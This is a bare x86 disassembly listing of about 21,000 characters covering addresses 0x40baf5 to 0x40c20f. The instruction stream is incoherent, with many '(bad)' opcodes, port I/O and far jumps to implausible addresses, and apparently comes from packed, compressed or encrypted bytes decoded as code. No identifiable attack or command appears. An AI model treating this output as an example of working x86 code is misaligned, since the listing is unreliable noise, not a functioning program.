  40baf5:	xchg   edi,eax
  40baf6:	jb     0x40baa5
  40baf8:	pop    eax
  40baf9:	aad    0x72
  40bafb:	sbb    ah,0x7f
  40bafe:	lea    eax,[ebx+0x30b813e1]
  40bb04:	jecxz  0x40bad3
  40bb06:	jns    0x40bb7d
  40bb08:	test   eax,0x2eeb07fb
  40bb0d:	iret   
  40bb0e:	mov    bh,0x94
  40bb10:	jge    0x40baf3
  40bb12:	popa   
  40bb13:	int3   
  40bb14:	cs cld 
  40bb16:	outs   dx,DWORD PTR ds:[esi]
  40bb17:	stos   WORD PTR es:[edi],ax
  40bb19:	lods   eax,DWORD PTR ds:[esi]
  40bb1a:	inc    esp
  40bb1b:	fwait
  40bb1c:	pop    eax
  40bb1d:	ret    0xe00e
  40bb20:	jbe    0x40babc
  40bb22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb23:	push   0xffffffb9
  40bb25:	loope  0x40bafd
  40bb27:	hlt    
  40bb28:	mov    esi,0x2ede5f9a
  40bb2d:	daa    
  40bb2e:	xor    DWORD PTR [ecx+0x27],ebx
  40bb31:	dec    ebx
  40bb32:	xchg   edx,eax
  40bb33:	out    dx,al
  40bb34:	dec    ecx
  40bb35:	rol    DWORD PTR [ebx+0x15],cl
  40bb38:	and    bl,BYTE PTR [edx+0x7744fb81]
  40bb3e:	out    0x5,al
  40bb40:	clc    
  40bb41:	push   esi
  40bb42:	xchg   esp,eax
  40bb43:	sub    BYTE PTR [ebx+0xf],0x70
  40bb47:	cmp    DWORD PTR [edi+0x408a5a95],edx
  40bb4d:	js     0x40bb78
  40bb4f:	dec    edx
  40bb50:	fstp   DWORD PTR [esi]
  40bb52:	bound  eax,QWORD PTR [ebx]
  40bb54:	and    eax,0xfc544a25
  40bb59:	inc    esp
  40bb5a:	test   eax,0x4d6c2c63
  40bb5f:	dec    edx
  40bb60:	xchg   ebx,eax
  40bb61:	les    esi,FWORD PTR [ebp+0x453d57b4]
  40bb67:	xor    DWORD PTR cs:[esi],esi
  40bb6a:	mov    edx,0xf25eb8db
  40bb6f:	mov    BYTE PTR [eax+0x13881f0c],ah
  40bb75:	shl    BYTE PTR [ebp-0x44],1
  40bb78:	enter  0x58ec,0x5d
  40bb7c:	loopne 0x40bb03
  40bb7e:	sbb    DWORD PTR [edi+0x4cf0efa5],0x7710d0eb
  40bb88:	sbb    eax,ecx
  40bb8a:	adc    al,0x36
  40bb8c:	xlat   BYTE PTR ds:[ebx]
  40bb8d:	test   DWORD PTR [edi+0x392df51],0xdfc9da9d
  40bb97:	mov    bh,0x9e
  40bb99:	(bad)
  40bb9c:	sbb    al,0x79
  40bb9e:	int    0xb8
  40bba0:	add    esp,eax
  40bba2:	fiadd  WORD PTR [esi-0x53]
  40bba5:	cmp    edi,DWORD PTR [edx+edi*2-0x45]
  40bba9:	cli    
  40bbaa:	mov    eax,0x81eb7784
  40bbaf:	jb     0x40bb7d
  40bbb1:	dec    ebp
  40bbb2:	xchg   esi,eax
  40bbb3:	adc    eax,0xe1cc9862
  40bbb8:	pop    ebx
  40bbb9:	jmp    0x40bb48
  40bbbb:	sar    DWORD PTR [edx+0x40],cl
  40bbbe:	mov    ebp,0x6f2bd9e3
  40bbc3:	pop    ebx
  40bbc4:	and    dh,al
  40bbc6:	and    BYTE PTR [ecx],dh
  40bbc8:	mov    ds:0x7c776847,eax
  40bbcd:	(bad)  
  40bbce:	ins    BYTE PTR es:[edi],dx
  40bbcf:	cmp    ebp,DWORD PTR [ebp+0x45]
  40bbd2:	dec    esp
  40bbd3:	adc    BYTE PTR [ecx-0x26],0xd7
  40bbd7:	repz adc al,0x1a
  40bbda:	in     eax,dx
  40bbdb:	outs   dx,DWORD PTR ds:[esi]
  40bbdc:	or     DWORD PTR [esp+eax*8+0x5a5eb153],0xb254aea0
  40bbe7:	jne    0x40bbd9
  40bbe9:	popa   
  40bbea:	retf   
  40bbeb:	xor    DWORD PTR [edx+eax*1-0x6d186166],esi
  40bbf2:	cmc    
  40bbf3:	cdq    
  40bbf4:	icebp  
  40bbf5:	imul   DWORD PTR [ecx-0x54]
  40bbf8:	sub    al,0xc3
  40bbfa:	ss int3 
  40bbfc:	jecxz  0x40bc75
  40bbfe:	xor    BYTE PTR fs:[ecx],bh
  40bc01:	mov    ecx,0xdbec6c7b
  40bc06:	pop    ss
  40bc07:	ins    DWORD PTR es:[edi],dx
  40bc08:	adc    ah,BYTE PTR [edx]
  40bc0a:	shl    DWORD PTR [eax+0x612d9b4],0x2
  40bc11:	jnp    0x40bbd0
  40bc13:	fisub  WORD PTR [edx-0x24]
  40bc16:	dec    ecx
  40bc17:	daa    
  40bc18:	and    ch,BYTE PTR [esi+edx*8]
  40bc1b:	cmc    
  40bc1c:	out    0x2f,al
  40bc1e:	cmp    eax,esp
  40bc20:	pushf  
  40bc21:	mov    al,0xf6
  40bc23:	dec    eax
  40bc24:	and    DWORD PTR [esi],0x208bc0d3
  40bc2a:	outs   dx,DWORD PTR ds:[esi]
  40bc2b:	mov    dh,0x74
  40bc2d:	jl     0x40bc7f
  40bc2f:	cmp    eax,0x5a8aa6dc
  40bc34:	mov    al,ds:0x33844d9f
  40bc39:	(bad)  
  40bc3a:	popf   
  40bc3b:	in     eax,dx
  40bc3c:	push   eax
  40bc3d:	push   cs
  40bc3e:	inc    esp
  40bc3f:	jp     0x40bbe8
  40bc41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc42:	js     0x40bbca
  40bc44:	jo     0x40bcc3
  40bc46:	and    bl,BYTE PTR [edx-0x1e]
  40bc49:	cmp    esp,DWORD PTR [ecx]
  40bc4b:	jo     0x40bbd3
  40bc4d:	jnp    0x40bc10
  40bc4f:	add    cl,BYTE PTR [eax+0x34]
  40bc52:	sbb    al,0xa5
  40bc54:	push   edi
  40bc55:	cmp    esi,DWORD PTR [eax+0x1f0fd813]
  40bc5b:	sub    DWORD PTR ds:0x1db62b9,eax
  40bc61:	xchg   ebx,eax
  40bc62:	(bad)  
  40bc63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc64:	test   DWORD PTR [edx],0x1c684dfd
  40bc6a:	aad    0xb8
  40bc6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc6d:	adc    bh,BYTE PTR [esi+0x47]
  40bc70:	bound  edx,QWORD PTR [edi-0x58d14630]
  40bc76:	push   edx
  40bc77:	lock loopne 0x40bc42
  40bc7a:	sbb    eax,0x36f19d5
  40bc7f:	sbb    DWORD PTR [eax],esi
  40bc81:	mov    dh,0xbc
  40bc83:	push   es
  40bc84:	push   eax
  40bc85:	popf   
  40bc86:	and    BYTE PTR [ebx-0x61],dl
  40bc89:	and    al,0xb7
  40bc8b:	xchg   edi,eax
  40bc8c:	push   edx
  40bc8d:	idiv   esi
  40bc8f:	jb     0x40bc83
  40bc91:	dec    edx
  40bc92:	jle    0x40bc57
  40bc94:	dec    esi
  40bc95:	sar    ebp,0xfa
  40bc98:	push   ecx
  40bc99:	nop
  40bc9a:	push   ecx
  40bc9b:	test   DWORD PTR [esi-0x5e86c559],esp
  40bca1:	inc    ebp
  40bca2:	repz mov esi,0x42e62022
  40bca8:	sub    ebp,DWORD PTR [edx+0x33fddf03]
  40bcae:	mov    DWORD PTR [esi+eiz*8],ecx
  40bcb1:	cli    
  40bcb2:	popf   
  40bcb3:	ret    
  40bcb4:	pop    ecx
  40bcb5:	clc    
  40bcb6:	js     0x40bc67
  40bcb8:	outs   dx,DWORD PTR ds:[esi]
  40bcb9:	repnz sti 
  40bcbb:	xchg   esi,eax
  40bcbc:	jmp    0x40bc5a
  40bcbe:	or     BYTE PTR [ecx],0xe5
  40bcc1:	scas   eax,DWORD PTR es:[edi]
  40bcc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bcc3:	call   0x775:0xb35fcda7
  40bcca:	fimul  DWORD PTR ds:0xb1081eaf
  40bcd0:	(bad)  
  40bcd2:	ins    DWORD PTR es:[edi],dx
  40bcd3:	add    eax,0xcae17771
  40bcd8:	mov    esi,0x1be85e95
  40bcdd:	hlt    
  40bcde:	xor    eax,0x5b6d2c1f
  40bce3:	sub    eax,0x2372358c
  40bce8:	jne    0x40bd07
  40bcea:	cdq    
  40bceb:	and    BYTE PTR ds:0xfcfc7a78,bl
  40bcf1:	inc    esi
  40bcf2:	and    al,0x3e
  40bcf4:	enter  0xe65f,0xe5
  40bcf8:	inc    esi
  40bcf9:	cmc    
  40bcfa:	into   
  40bcfb:	fld    QWORD PTR [esi]
  40bcfd:	div    BYTE PTR [eax+0x29]
  40bd00:	ffree  st(1)
  40bd02:	sub    ebp,DWORD PTR ds:0xdd8bbd2b
  40bd08:	int    0x5c
  40bd0a:	pop    ds
  40bd0b:	xchg   esp,eax
  40bd0c:	xor    edx,0xd50b31f4
  40bd12:	bound  edx,QWORD PTR [eax+ecx*2-0x3aba8f1a]
  40bd19:	dec    esp
  40bd1a:	mov    BYTE PTR [ecx],dh
  40bd1c:	fstp   st(4)
  40bd1e:	cmp    eax,0x268a0945
  40bd23:	je     0x40bd61
  40bd25:	fimul  DWORD PTR [ecx]
  40bd27:	imul   esp,DWORD PTR [ecx-0x41],0x6ca8e081
  40bd2e:	pop    edi
  40bd2f:	mov    bh,0xd0
  40bd31:	cmp    edx,DWORD PTR [ebx]
  40bd33:	cmc    
  40bd34:	add    DWORD PTR [esi-0x71],eax
  40bd37:	and    BYTE PTR [ecx+eax*8-0x3d],0x9c
  40bd3c:	mov    WORD PTR [esp+eax*2],fs
  40bd3f:	pop    edx
  40bd40:	pop    ebp
  40bd41:	push   es
  40bd42:	cmp    ch,BYTE PTR [ecx-0x590a72b1]
  40bd48:	ficom  DWORD PTR [ecx]
  40bd4a:	and    DWORD PTR [esi+0x449b10e9],0x9323f05
  40bd54:	add    DWORD PTR [edx+edx*1-0x5a],esi
  40bd58:	adc    cl,BYTE PTR [ebp+ebp*8-0x28]
  40bd5c:	cmp    ch,0x33
  40bd5f:	and    eax,0xf3a93d36
  40bd64:	imul   DWORD PTR [ebx+0x4d]
  40bd67:	test   DWORD PTR [esi-0x5ce9eefe],0xc2378ff7
  40bd71:	cdq    
  40bd72:	adc    eax,0xe201c39b
  40bd77:	add    eax,0x1e72bfbd
  40bd7c:	sbb    eax,0x57553ee5
  40bd81:	adc    dh,al
  40bd83:	in     al,0xf5
  40bd85:	mov    eax,0xddc12e1c
  40bd8a:	push   ebp
  40bd8b:	dec    esp
  40bd8c:	repz cs jbe 0x40be09
  40bd90:	stos   BYTE PTR es:[edi],al
  40bd91:	dec    esp
  40bd92:	mov    bl,BYTE PTR [ecx]
  40bd94:	cmp    dh,0x81
  40bd97:	and    cl,BYTE PTR [ecx]
  40bd99:	pop    eax
  40bd9b:	adc    ah,BYTE PTR [edi-0x6afdbe4]
  40bda1:	sahf   
  40bda2:	adc    eax,ebp
  40bda4:	xchg   edi,eax
  40bda5:	addr16 jo 0x40bdc5
  40bda8:	fsubr  DWORD PTR [edx-0x35632bce]
  40bdae:	out    dx,eax
  40bdaf:	xor    eax,0x6aa9449e
  40bdb4:	divps  xmm6,xmm7
  40bdb7:	dec    eax
  40bdb8:	adc    eax,DWORD PTR [edi]
  40bdba:	fwait
  40bdbb:	mov    eax,ds:0x198fff5a
  40bdc0:	out    dx,eax
  40bdc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdc2:	jmp    0x40be13
  40bdc4:	test   al,0xed
  40bdc6:	cdq    
  40bdc7:	fist   DWORD PTR [ecx+edi*1+0x68cf9b3f]
  40bdce:	sub    ah,BYTE PTR [ecx+0x24]
  40bdd1:	push   cs
  40bdd2:	lahf   
  40bdd3:	push   ds
  40bdd4:	sbb    esp,DWORD PTR [ecx-0x1a]
  40bdd7:	mov    al,0x17
  40bdd9:	xor    al,0xcd
  40bddb:	jp     0x40bdb5
  40bddd:	ins    BYTE PTR es:[edi],dx
  40bdde:	cmp    al,BYTE PTR [ebx+0x1e]
  40bde1:	jb     0x40be41
  40bde3:	and    ecx,DWORD PTR [eax]
  40bde5:	call   0xc89b87d9
  40bdea:	repz lea ebp,[edi+0x6d]
  40bdee:	sub    eax,DWORD PTR [ebx-0x494bd25e]
  40bdf4:	push   0x30
  40bdf6:	cmp    ecx,DWORD PTR ds:0x7630cb9c
  40bdfc:	(bad)  
  40bdfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdfe:	sub    eax,0xc90a799e
  40be03:	push   ebp
  40be04:	mov    ch,0xbc
  40be06:	pop    edx
  40be07:	aaa    
  40be08:	ins    BYTE PTR es:[edi],dx
  40be09:	fiadd  DWORD PTR [ebx]
  40be0b:	xchg   ebp,eax
  40be0c:	mov    ah,0x75
  40be0e:	or     esp,ebx
  40be10:	push   ecx
  40be11:	and    dl,bh
  40be13:	sbb    ebp,DWORD PTR [ecx+eax*8-0x4fcef5b2]
  40be1a:	test   DWORD PTR [esi],eax
  40be1c:	push   0x44553b49
  40be21:	or     al,bl
  40be23:	and    BYTE PTR [ecx+0x32b4dc2b],ah
  40be29:	ror    DWORD PTR [esi-0x69],1
  40be2c:	pop    ebp
  40be2d:	sahf   
  40be2e:	ins    DWORD PTR es:[edi],dx
  40be2f:	iret   
  40be30:	cmp    eax,0x952da61d
  40be35:	loopne 0x40bdeb
  40be37:	inc    ecx
  40be38:	jmp    FWORD PTR [edx]
  40be3a:	cmp    al,0xf2
  40be3c:	mov    esp,0x31eebab5
  40be41:	add    eax,0xeda28274
  40be46:	das    
  40be47:	xchg   DWORD PTR [ecx],ebp
  40be49:	pop    ss
  40be4a:	jecxz  0x40becb
  40be4c:	iret   
  40be4d:	add    esi,DWORD PTR [eax+edi*2]
  40be50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be51:	ror    DWORD PTR [ecx+0x3f],cl
  40be54:	xchg   edi,eax
  40be55:	pop    ebx
  40be56:	in     eax,dx
  40be57:	cwde   
  40be58:	inc    edx
  40be59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be5a:	imul   ebx,DWORD PTR [esi-0x161b3fcd],0xb43e87d6
  40be64:	mov    dh,0xba
  40be66:	pop    es
  40be67:	mov    edx,0x5cd3b05a
  40be6c:	jp     0x40be81
  40be6e:	nop
  40be6f:	pop    ss
  40be70:	or     al,0x6
  40be72:	loop   0x40be43
  40be74:	jmp    0x4c145a99
  40be79:	cmc    
  40be7a:	repz push esi
  40be7c:	leave  
  40be7d:	test   BYTE PTR [ebx],bh
  40be7f:	xchg   edx,eax
  40be81:	(bad)  
  40be82:	sub    eax,0xa12bd3dc
  40be87:	(bad)  
  40be88:	inc    DWORD PTR ds:0x53c9b1bc
  40be8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be8f:	push   ecx
  40be90:	js     0x40befb
  40be92:	rcr    BYTE PTR [ebx],1
  40be94:	inc    edx
  40be95:	mov    bl,0x89
  40be97:	test   ebx,0xbe973ac4
  40be9d:	inc    ebx
  40be9e:	pop    edx
  40be9f:	leave  
  40bea0:	xchg   BYTE PTR [ecx+0x42c2cb91],cl
  40bea6:	sub    eax,0x9ae42dc
  40beab:	xchg   esi,eax
  40beac:	xor    eax,0x1fea3c45
  40beb1:	adc    al,0x78
  40beb3:	lock lods eax,DWORD PTR ds:[esi]
  40beb5:	inc    ecx
  40beb6:	inc    esp
  40beb7:	cmp    esp,DWORD PTR [esi-0x6e66fb16]
  40bebd:	xchg   edx,eax
  40bebe:	pop    ds
  40bebf:	push   ebp
  40bec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bec1:	add    eax,0xee308761
  40bec6:	pop    esi
  40bec7:	or     BYTE PTR [ebx],bl
  40bec9:	nop
  40beca:	mov    ch,0xe9
  40becc:	pop    esp
  40becd:	sar    cl,1
  40becf:	mov    ds,esi
  40bed1:	pop    edx
  40bed2:	jns    0x40be8e
  40bed4:	call   DWORD PTR [edi-0x71fc1e62]
  40beda:	das    
  40bedb:	cli    
  40bedc:	dec    esp
  40bedd:	in     eax,0x42
  40bedf:	lock sar DWORD PTR [ebx],1
  40bee2:	out    dx,al
  40bee3:	dec    eax
  40bee4:	mov    esp,esi
  40bee6:	xchg   DWORD PTR [ebx-0x4e],esp
  40bee9:	into   
  40beea:	or     al,BYTE PTR [eax]
  40beec:	imul   ecx,esi,0xffe784f4
  40bef2:	pop    ebp
  40bef3:	jns    0x40bf43
  40bef5:	jmp    0x55ec54b3
  40befa:	xchg   ebp,eax
  40befb:	int3   
  40befc:	xchg   ebx,eax
  40befd:	push   0x7fb2a44a
  40bf02:	mov    eax,DWORD PTR [edx]
  40bf04:	fisttp DWORD PTR cs:[eax-0x73b75182]
  40bf0b:	int    0x31
  40bf0d:	push   esi
  40bf0e:	xchg   edx,ebx
  40bf10:	mov    BYTE PTR [eax+0xa],ah
  40bf13:	outs   dx,BYTE PTR ds:[esi]
  40bf14:	dec    eax
  40bf15:	inc    BYTE PTR [edx+0x54]
  40bf18:	or     esp,edi
  40bf1a:	inc    edx
  40bf1b:	out    dx,eax
  40bf1c:	pushf  
  40bf1d:	or     al,0x4c
  40bf1f:	ins    DWORD PTR es:[edi],dx
  40bf20:	jno    0x40bef9
  40bf22:	sub    al,0x51
  40bf24:	mov    al,0x6e
  40bf26:	je     0x40bec5
  40bf28:	jo     0x40bf57
  40bf2a:	test   ebx,esi
  40bf2c:	inc    edx
  40bf2d:	fwait
  40bf2e:	jns    0x40bf19
  40bf30:	sbb    al,0x3c
  40bf32:	mov    DWORD PTR [ebx],ecx
  40bf34:	or     DWORD PTR [ecx],edx
  40bf36:	sub    al,0x89
  40bf38:	jae    0x40bef2
  40bf3a:	or     ebx,ebx
  40bf3c:	mov    ds:0x30651106,al
  40bf41:	add    edi,DWORD PTR [edi-0x199c9dc7]
  40bf47:	pop    esp
  40bf48:	ins    DWORD PTR es:[edi],dx
  40bf49:	fiadd  DWORD PTR [ecx+0x3113e06d]
  40bf4f:	inc    ebx
  40bf50:	jl     0x40bed6
  40bf52:	(bad)  
  40bf53:	xchg   edx,eax
  40bf54:	push   ecx
  40bf55:	sbb    eax,0x63c1431
  40bf5a:	jle    0x40bfb1
  40bf5c:	pop    esp
  40bf5d:	inc    ebx
  40bf5e:	mov    edx,0xac7369e
  40bf63:	je     0x40beec
  40bf65:	shl    DWORD PTR [eax-0x22],0x25
  40bf69:	adc    eax,0xe0127df1
  40bf6e:	and    eax,0xca4fa9ab
  40bf73:	xchg   edi,eax
  40bf74:	outs   dx,DWORD PTR ds:[esi]
  40bf75:	pop    ecx
  40bf76:	stos   DWORD PTR es:[edi],eax
  40bf77:	cs repz clc 
  40bf7a:	push   edx
  40bf7b:	inc    esp
  40bf7c:	dec    esi
  40bf7d:	mov    al,ds:0x891c44f3
  40bf82:	int3   
  40bf83:	mov    ds:0x563316e6,eax
  40bf88:	es xor eax,0x27322c42
  40bf8e:	loope  0x40bfee
  40bf90:	mov    bh,0x29
  40bf92:	scas   al,BYTE PTR es:[edi]
  40bf93:	dec    DWORD PTR [ebx+0x217ee7b8]
  40bf99:	ins    DWORD PTR es:[edi],dx
  40bf9a:	lods   al,BYTE PTR ds:[esi]
  40bf9b:	xchg   esp,eax
  40bf9c:	(bad)  
  40bf9d:	stc    
  40bf9e:	sub    BYTE PTR [ecx+0x28],bh
  40bfa1:	push   edi
  40bfa2:	adc    ecx,esi
  40bfa4:	repz rcr DWORD PTR [edx],1
  40bfa7:	je     0x40bf89
  40bfa9:	jbe    0x40bf62
  40bfab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfac:	add    al,0xba
  40bfae:	cmc    
  40bfaf:	mov    esi,ss
  40bfb1:	das    
  40bfb2:	mov    ebx,esp
  40bfb4:	mov    eax,ds:0x23b3d670
  40bfb9:	xchg   dl,dh
  40bfbb:	mov    ecx,DWORD PTR [ecx+ebp*8-0x33]
  40bfbf:	sbb    ch,BYTE PTR [ebp+0x2a]
  40bfc2:	dec    ebp
  40bfc3:	sti    
  40bfc4:	pop    esp
  40bfc5:	xchg   ebp,eax
  40bfc6:	in     eax,dx
  40bfc7:	cwde   
  40bfc8:	ss push edi
  40bfca:	mov    ah,BYTE PTR [esi-0x71]
  40bfcd:	mov    esi,DWORD PTR [ebx-0x8]
  40bfd0:	push   ecx
  40bfd1:	test   BYTE PTR [esi],bh
  40bfd3:	(bad)  
  40bfd4:	and    ah,BYTE PTR [ebp+0x4819aff1]
  40bfda:	inc    ecx
  40bfdb:	lds    esi,FWORD PTR [ecx]
  40bfdd:	retf   
  40bfde:	fidivr DWORD PTR [edi]
  40bfe0:	lock push ss
  40bfe2:	mov    edx,0xc9712060
  40bfe7:	sbb    edi,edx
  40bfe9:	mov    esi,0x8e6d859b
  40bfee:	mov    cl,0x4d
  40bff0:	fld    DWORD PTR [ebp-0x220d549b]
  40bff6:	jecxz  0x40bf89
  40bff8:	ins    BYTE PTR es:[edi],dx
  40bff9:	dec    edi
  40bffa:	inc    ebp
  40bffb:	xchg   BYTE PTR [edx+0x56],ch
  40bffe:	retf   
  40bfff:	shl    DWORD PTR [ebx+ebx*4-0x6e49291c],cl
  40c006:	xor    al,0xa
  40c008:	pop    esp
  40c009:	sub    ah,BYTE PTR [ecx]
  40c00b:	push   ebx
  40c00c:	mov    dl,0xd9
  40c00e:	sbb    eax,0xffffffc5
  40c011:	daa    
  40c012:	mov    esi,0x7818cefc
  40c017:	scas   al,BYTE PTR es:[edi]
  40c018:	loop   0x40bfe3
  40c01a:	xchg   edx,eax
  40c01b:	pop    ds
  40c01c:	aas    
  40c01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c01e:	pop    esp
  40c01f:	mov    BYTE PTR ds:0x8fb31dfa,ah
  40c025:	push   cs
  40c026:	les    eax,FWORD PTR [esi-0x257651a1]
  40c02c:	jnp    0x40bfda
  40c02e:	shl    eax,cl
  40c030:	(bad)  
  40c032:	dec    ecx
  40c033:	lds    ebp,FWORD PTR [ebp-0x1662a353]
  40c039:	mov    ah,0x7b
  40c03b:	icebp  
  40c03c:	mov    edi,eax
  40c03e:	test   eax,0xec3f2892
  40c043:	popf   
  40c044:	pop    ecx
  40c045:	mov    ds:0x83926379,eax
  40c04a:	pop    ss
  40c04b:	xor    al,0xc8
  40c04d:	sbb    DWORD PTR [edi],0xffffff9e
  40c050:	mov    dh,0x19
  40c052:	or     al,0x93
  40c054:	and    ch,BYTE PTR [ecx-0x1fc2077b]
  40c05a:	add    DWORD PTR [ecx+0x55],esi
  40c05d:	lahf   
  40c05e:	xchg   ecx,ebp
  40c060:	mov    eax,ds:0x19339d62
  40c065:	inc    esi
  40c066:	dec    eax
  40c067:	inc    eax
  40c068:	in     al,0xd0
  40c06a:	pusha  
  40c06b:	out    0x60,eax
  40c06d:	in     al,dx
  40c06e:	ins    BYTE PTR es:[edi],dx
  40c06f:	rcr    ebx,1
  40c071:	cmc    
  40c072:	(bad)  
  40c074:	das    
  40c075:	dec    edx
  40c076:	add    ebx,ebx
  40c078:	retf   0x1857
  40c07b:	mov    WORD PTR [edx-0x336c5886],?
  40c081:	fstp   st(6)
  40c083:	adc    DWORD PTR [edi],esp
  40c085:	xlat   BYTE PTR ds:[ebx]
  40c086:	inc    edi
  40c087:	ret    
  40c088:	jae    0x40c00d
  40c08a:	(bad)  
  40c08b:	jmp    0xc3a364be
  40c090:	lods   eax,DWORD PTR ds:[esi]
  40c091:	gs aas 
  40c093:	scas   eax,DWORD PTR es:[edi]
  40c094:	and    eax,0xffcdfc4b
  40c099:	loope  0x40c08f
  40c09b:	cmc    
  40c09c:	cmp    DWORD PTR [ebp+0x50],esi
  40c09f:	jne    0x40c0a3
  40c0a1:	inc    ecx
  40c0a2:	pusha  
  40c0a3:	imul   esi,edx,0x28e7814a
  40c0a9:	aad    0xee
  40c0ab:	jg     0x40c104
  40c0ad:	xor    eax,0x8f2155b2
  40c0b2:	out    0x49,eax
  40c0b4:	xchg   esp,eax
  40c0b5:	and    eax,esi
  40c0b7:	popa   
  40c0b8:	push   esi
  40c0b9:	xor    cl,al
  40c0bb:	pop    edi
  40c0bc:	jae    0x40c0d6
  40c0be:	push   ecx
  40c0bf:	hlt    
  40c0c0:	inc    eax
  40c0c1:	(bad)  
  40c0c2:	popf   
  40c0c3:	(bad)  
  40c0c4:	dec    esi
  40c0c5:	adc    dh,BYTE PTR [ecx]
  40c0c7:	xor    eax,0xe9cd7dc9
  40c0cc:	mov    al,0xb3
  40c0ce:	stos   BYTE PTR es:[edi],al
  40c0cf:	mov    DWORD PTR [edx],0x7b360dc5
  40c0d5:	lods   al,BYTE PTR ds:[esi]
  40c0d6:	cmp    ax,0x97b2
  40c0da:	jmp    0x40c12c
  40c0dc:	fnsave [ebx]
  40c0de:	sub    al,0xc6
  40c0e0:	xor    al,0x36
  40c0e2:	jg     0x40c145
  40c0e4:	js     0x40c0d6
  40c0e6:	pop    esp
  40c0e7:	jb     0x40c087
  40c0e9:	pop    ds
  40c0ea:	aad    0x75
  40c0ec:	xchg   edi,eax
  40c0ed:	hlt    
  40c0ee:	mov    ds:0x3aecfba0,eax
  40c0f3:	push   cs
  40c0f4:	sbb    al,0xce
  40c0f6:	sbb    bl,BYTE PTR [ecx+0x609bebd3]
  40c0fc:	rcl    DWORD PTR [eax-0x16],cl
  40c0ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c100:	cmp    edi,esi
  40c102:	and    edx,edi
  40c104:	mov    al,ds:0xd96a27d1
  40c109:	(bad)  
  40c10a:	into   
  40c10b:	sbb    eax,0xec0ce304
  40c110:	rcl    esi,1
  40c112:	push   es
  40c113:	repz (bad) 
  40c115:	pop    ds
  40c116:	or     BYTE PTR [edx+0x60ad8cf5],ah
  40c11c:	daa    
  40c11d:	mov    al,ds:0x51cf8a8b
  40c122:	jge    0x40c17c
  40c124:	mov    eax,0x9ec567ea
  40c129:	fidivr DWORD PTR [ebx]
  40c12b:	or     al,0x71
  40c12d:	dec    ebx
  40c12e:	push   es
  40c12f:	xor    DWORD PTR [esi],edi
  40c131:	adc    al,0xce
  40c133:	sbb    eax,0x9f187169
  40c138:	in     eax,dx
  40c139:	pop    ecx
  40c13a:	es js  0x40c10c
  40c13d:	sbb    bh,BYTE PTR cs:[eax+0x73]
  40c141:	leave  
  40c142:	aad    0x1a
  40c144:	js     0x40c113
  40c146:	sub    BYTE PTR [ebx-0x26],bl
  40c149:	loope  0x40c194
  40c14b:	push   es
  40c14c:	cmp    ebx,DWORD PTR [edi]
  40c14e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c14f:	cmp    BYTE PTR [eax+0x30],bh
  40c152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c153:	mov    al,BYTE PTR [eax+0x575cd770]
  40c159:	sbb    BYTE PTR [esi],bl
  40c15b:	pop    eax
  40c15c:	iret   
  40c15d:	cs xchg ecx,eax
  40c15f:	sbb    eax,0x3281cfb5
  40c164:	call   0xb1c90826
  40c169:	imul   eax,DWORD PTR [esi-0x49f3a746],0xffffffb0
  40c170:	imul   dh
  40c172:	mov    edx,0x32287c7b
  40c177:	cli    
  40c178:	mov    ah,0x39
  40c17a:	sbb    al,0x1a
  40c17c:	call   0x602acc79
  40c181:	jo     0x40c16c
  40c183:	adc    esp,DWORD PTR [esi]
  40c185:	scas   eax,DWORD PTR es:[edi]
  40c186:	push   DWORD PTR [ebp+0x56]
  40c189:	push   0x6a811945
  40c18e:	hlt    
  40c18f:	je     0x40c1f4
  40c191:	mov    BYTE PTR [edx-0x32],bl
  40c194:	pop    esp
  40c195:	aas    
  40c196:	push   esp
  40c197:	std    
  40c198:	xor    DWORD PTR [eax],eax
  40c19a:	jmp    0x40c150
  40c19c:	pop    esi
  40c19d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c19e:	jnp    0x40c181
  40c1a0:	pop    esi
  40c1a1:	mov    bh,0x2f
  40c1a3:	(bad)  
  40c1a4:	sahf   
  40c1a5:	xor    DWORD PTR [esi],ecx
  40c1a7:	jo     0x40c189
  40c1a9:	inc    edi
  40c1aa:	cmp    cl,ch
  40c1ac:	mov    BYTE PTR [ebx+ebp*4-0x601fff62],cl
  40c1b3:	mov    edx,0xba682fa4
  40c1b8:	outs   dx,DWORD PTR ds:[esi]
  40c1b9:	jg     0x40c1fd
  40c1bb:	mov    ebp,0xc0649a0
  40c1c0:	sbb    bh,al
  40c1c2:	in     eax,0x78
  40c1c4:	xor    ebx,edi
  40c1c6:	and    BYTE PTR [ebx-0x15],al
  40c1c9:	sbb    esp,edi
  40c1cb:	fwait
  40c1cc:	sbb    BYTE PTR [ebx-0x1fef3b57],dl
  40c1d2:	outs   dx,BYTE PTR ds:[esi]
  40c1d3:	cmp    DWORD PTR [ebp-0x4332a3bd],0xfffffff2
  40c1da:	div    dh
  40c1dc:	mov    ah,0x0
  40c1de:	and    cl,BYTE PTR [esp+eax*1]
  40c1e1:	sub    eax,0x6bd31835
  40c1e6:	push   ss
  40c1e7:	mov    dl,0x86
  40c1e9:	push   es
  40c1ea:	add    eax,0xe1decca7
  40c1ef:	xchg   ebx,eax
  40c1f0:	sar    BYTE PTR [eax-0x369085ca],1
  40c1f6:	leave  
  40c1f7:	loope  0x40c217
  40c1f9:	pop    ecx
  40c1fa:	push   ss
  40c1fb:	fsub   st(1),st
  40c1fd:	retf   0x646d
  40c200:	mov    bh,0xcc
  40c202:	cmp    BYTE PTR fs:[ebx],bh
  40c205:	sub    eax,0xb71d7312
  40c20a:	cld    
  40c20b:	cmp    esi,edx
  40c20d:	lahf   
  40c20e:	push   edx
  40c20f:	add    DWORD PTR [edi],ebx
